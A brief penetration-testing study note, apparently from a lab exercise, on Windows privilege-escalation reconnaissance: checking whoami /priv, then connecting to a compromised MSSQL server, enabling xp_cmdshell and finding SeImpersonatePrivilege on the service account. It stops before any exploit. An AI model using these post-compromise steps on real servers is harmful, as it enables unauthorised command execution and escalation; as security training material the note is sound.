
## first command after getting windows shell:
        
    whoami /priv

### You may see:

    SeImpersonatePrivilege
                    Enabled

### Example with MSSQL
Suppose you compromise an MSSQL server.

You connect:

    mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Then enable command execution:

    enable_xp_cmdshell

Now:
      
    xp_cmdshell whoami

Maybe you get:

    nt service\mssqlserver

So you're not SYSTEM.
Now check:

    xp_cmdshell whoami /priv

Suppose you see:

    SeImpersonatePrivilege    Enabled
